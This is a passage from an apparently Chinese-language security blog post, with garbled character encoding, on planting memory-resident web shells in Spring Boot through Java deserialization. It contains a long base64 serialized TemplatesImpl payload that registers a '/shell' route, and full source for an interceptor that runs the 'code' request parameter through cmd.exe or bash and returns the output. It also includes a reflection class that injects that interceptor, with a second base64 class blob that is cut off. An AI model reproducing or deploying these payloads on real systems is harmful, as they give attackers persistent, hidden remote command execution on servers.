MamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAIaW5zdGFuY2UBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAJycwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAm1tAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAIkxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsBAA1TdGFja01hcFRhYmxlBwCSAQAKU291cmNlRmlsZQEAFUNvbnRyb2xsZXJCZWhpbmQuamF2YQwALwAwAQsweXY2NnZnQUFBRFFBaFFvQUlRQkJDQUJDQ3dCREFFUUxBRVVBUmdnQVJ3Z0FTQW9BU1FCS0NnQU1BRXNJQUV3S0FBd0FUUWNBVGdjQVR3Z0FVQWdBVVFvQUN3QlNDQUJUQ0FCVUJ3QlZDZ0FMQUZZS0FGY0FXQW9BRWdCWkNBQmFDZ0FTQUZzS0FCSUFYQW9BRWdCZENnQVNBRjRLQUY4QVlBb0FYd0JoQ2dCZkFGNExBRVVBWWdjQVl3Y0FaQWNBWlFFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUE3VEc5eVp5OWpiRzkzYmk5emNISnBibWRpYjI5MGJXVnRiM0o1YzJobGJHd3ZZMjl1ZEc5eWJHeGxjaTlVWlhOMFEyOXVkSEp2Ykd4bGNqc0JBQVIwWlhOMEFRQlNLRXhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wTzB4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWE53YjI1elpUc3BWZ0VBQVhBQkFCcE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTkNkV2xzWkdWeU93RUFBVzhCQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBRmpBUUFUVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUJHRnlaekFCQUFaM2NtbDBaWElCQUJWTWFtRjJZUzlwYnk5UWNtbHVkRmR5YVhSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQU5VM1JoWTJ0TllYQlVZV0pzWlFjQVR3Y0FaZ2NBVGdjQVZRY0FZd0VBRUUxbGRHaHZaRkJoY21GdFpYUmxjbk1CQUFwVGIzVnlZMlZHYVd4bEFRQVRWR1Z6ZEVOdmJuUnliMnhzWlhJdWFtRjJZUXdBSWdBakFRQUVZMjlrWlFjQVp3d0FhQUJwQndCcURBQnJBR3dCQUFBQkFBZHZjeTV1WVcxbEJ3QnREQUJ1QUdrTUFHOEFjQUVBQTNkcGJnd0FjUUJ5QVFBWWFtRjJZUzlzWVc1bkwxQnliMk5sYzNOQ2RXbHNaR1Z5QVFBUWFtRjJZUzlzWVc1bkwxTjBjbWx1WndFQUIyTnRaQzVsZUdVQkFBSXZZd3dBSWdCekFRQUhMMkpwYmk5emFBRUFBaTFqQVFBUmFtRjJZUzkxZEdsc0wxTmpZVzV1WlhJTUFIUUFkUWNBZGd3QWR3QjREQUFpQUhrQkFBSmNRUXdBZWdCN0RBQjhBSDBNQUg0QWNBd0Fmd0FqQndCbURBQ0FBSUVNQUlJQUl3d0Fnd0NFQVFBVGFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJnRUFPVzl5Wnk5amJHOTNiaTl6Y0hKcGJtZGliMjkwYldWdGIzSjVjMmhsYkd3dlkyOXVkRzl5Ykd4bGNpOVVaWE4wUTI5dWRISnZiR3hsY2dFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFsYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnhkV1Z6ZEFFQURHZGxkRkJoY21GdFpYUmxjZ0VBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQW1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WemNHOXVjMlVCQUFsblpYUlhjbWwwWlhJQkFCY29LVXhxWVhaaEwybHZMMUJ5YVc1MFYzSnBkR1Z5T3dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBQzNSdlRHOTNaWEpEWVhObEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBVnpkR0Z5ZEFFQUZTZ3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFGWTJ4dmMyVUJBQVYzY21sMFpRRUFGU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVmdFQUJXWnNkWE5vQVFBSmMyVnVaRVZ5Y205eUFRQUVLRWtwVmdBaEFDQUFJUUFBQUFBQUFnQUJBQ0lBSXdBQkFDUUFBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBSlFBQUFBWUFBUUFBQUEwQUpnQUFBQXdBQVFBQUFBVUFKd0FvQUFBQUFRQXBBQ29BQWdBa0FBQUJxQUFHQUFnQUFBQ3pLeElDdVFBREFnQk9MTGtBQkFFQU9nUXR4Z0NURWdVNkJSSUd1QUFIdGdBSUVnbTJBQXFaQUNHN0FBdFpCcjBBREZrREVnMVRXUVFTRGxOWkJTMVR0d0FQT2dhbkFCNjdBQXRaQnIwQURGa0RFaEJUV1FRU0VWTlpCUzFUdHdBUE9nYTdBQkpaR1FhMkFCTzJBQlMzQUJVU0ZyWUFGem9IR1FlMkFCaVpBQXNaQjdZQUdhY0FCUmtGT2dVWkI3WUFHaGtFR1FXMkFCc1pCTFlBSEJrRXRnQWRwd0FNTEJFQmxMa0FIZ0lBcHdBRVRyRUFBUUFBQUs0QXNRQWZBQU1BSlFBQUFFb0FFZ0FBQUJBQUNRQVJBQkVBRWdBVkFCTUFHUUFWQUNrQUZnQkhBQmdBWWdBYkFIZ0FIQUNNQUIwQWtRQWVBSmdBSHdDZEFDQUFvZ0FoQUtVQUlnQ3VBQ1lBc1FBa0FMSUFKd0FtQUFBQVhBQUpBRVFBQXdBckFDd0FCZ0FaQUlrQUxRQXVBQVVBWWdCQUFDc0FMQUFHQUhnQUtnQXZBREFBQndBSkFLVUFNUUF1QUFNQUVRQ2RBRElBTXdBRUFBQUFzd0FuQUNnQUFBQUFBTE1BTkFBMUFBRUFBQUN6QURZQU53QUNBRGdBQUFBcEFBaitBRWNIQURrSEFEb0hBRG44QUJvSEFEdjhBQ1VIQUR4QkJ3QTUrQUFhK1FBSVFnY0FQUUFBUGdBQUFBa0NBRFFBQUFBMkFBQUFBUUEvQUFBQUFnQkEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDACXAJgBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9TdHJpbmcHAJkMAJoATAwAmwCcBwCdDACeAJ8HAKAMAKEAogwAowCkAQAQamF2YS9sYW5nL09iamVjdAEAOW9yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuY29udG9ybGxlci5UZXN0Q29udHJvbGxlcgwApQCmDACnAKgMAKkAqgcAqwwArACtBwCuDACvALABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAEkluc3RhbmNlIGNyZWF0ZWQ6IAwAsQCyDACxALMMALQAtQcAtgwAtwC4BwC5DAC6ALsBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHALwMAL0AvgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEABi9zaGVsbAwALwC/AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwALwDAAQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAwQDCDADDAMQMAMUAxgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMcAMAEAGmNvbS9jbG93bi9Db250cm9sbGVyQmVoaW5kAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAD3JlZ2lzdGVyTWFwcGluZwEAbihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbztMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOylWAQAPcHJpbnRTdGFja1RyYWNlACEALQAuAAAAAAAEAAEALwAwAAEAMQAAAC8AAQABAAAABSq3AAGxAAAAAgAyAAAABgABAAAAEQAzAAAADAABAAAABQA0ADUAAAABADYANwADADEAAAA/AAAAAwAAAAGxAAAAAgAyAAAABgABAAAALAAzAAAAIAADAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABADoAOwACADwAAAAEAAEAPQA+AAAACQIAOAAAADoAAAABADYAPwADADEAAABJAAAABAAAAAGxAAAAAgAyAAAABgABAAAAMQAzAAAAKgAEAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABAEAAQQACAAAAAQBCAEMAAwA8AAAABAABAD0APgAAAA0DADgAAABAAAAAQgAAAAgARAAwAAEAMQAAAfsACQALAAAA7BICS7sAA1m3AAQqtgAFTBIGEgcHvQAIWQMSCVNZBBIKU1kFsgALU1kGsgALU7YADE0sBLYADSy4AA62AA8HvQAQWQMSEVNZBCtTWQUDuAASU1kGK764ABJTtgATwAAITi0DvQAItgAUOgQZBAO9ABC2ABU6BbIAFrsAF1m3ABgSGbYAGhkFtgAbtgActgAduAAeEh8DuQAgAwDAACE6BrsAIlkEvQAJWQMSI1O3ACQ6B7sAJVkZBwEBAQEBAbcAJjoIGQYSJ7kAKAIAwAAnOgkttgApAzI6ChkJGQgZBRkKtgAqpwAISyq2ACyxAAEAAADjAOYAKwAEADIAAABKABIAAAAUAAMAFQAPABYAMQAXADYAGABgABkAagAaAHUAGwCPABwAnwAdALEAHgDCAB8A0AAhANgAIgDjACUA5gAjAOcAJADrACcAMwAAAHoADAADAOAARQBGAAAADwDUAEcASAABADEAsgBJAEoAAgBgAIMASwBMAAMAagB5AE0ATgAEAHUAbgBPAFAABQCfAEQAUQBSAAYAsQAyAFMAVAAHAMIAIQBVAFYACADQABMAVwBYAAkA2AALAFkASgAKAOcABABaAFsAAABcAAAAFgACAGAAgwBLAF0AAwBqAHkATQBeAAQAXwAAAAkAAvcA5gcAYAQAAQBhAAAAAgBicHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAt<br></code></pre></td></tr></table></figure><p>ç„¶åä¼ ç»™æ¼æ´è·¯ç”±ï¼Œè®°å¾—urlç¼–ç ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241114161649942.png" alt="image-20241114161649942"></p><p>ç„¶åç°åœ¨å°±æ˜¯æˆåŠŸæ‰“å…¥äº†ï¼Œè¿”å›erroræ˜¯é“¾å­ååºåˆ—åŒ–çš„æ—¶å€™æŠ›å¼‚å¸¸ä½†æ˜¯ä»£ç å·²ç»æ˜¯æ‰§è¡Œäº†çš„</p><p>ç°åœ¨è®¿é—®shellè·¯ç”±å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241114161757835.png" alt="image-20241114161757835"></p><h2 id="ååºåˆ—åŒ–åˆ©ç”¨interceptor"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Interceptor" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Interceptor"></a>ååºåˆ—åŒ–åˆ©ç”¨Interceptor</h2><p>è¿™é‡Œçš„åˆ©ç”¨ä¹Ÿç±»ä¼¼ï¼Œé‚£å°±èµ°ä¸€éæµç¨‹</p><p>è¦æ³¨å†Œçš„Interceptor</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorDes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br>            <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(AbstractHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2Y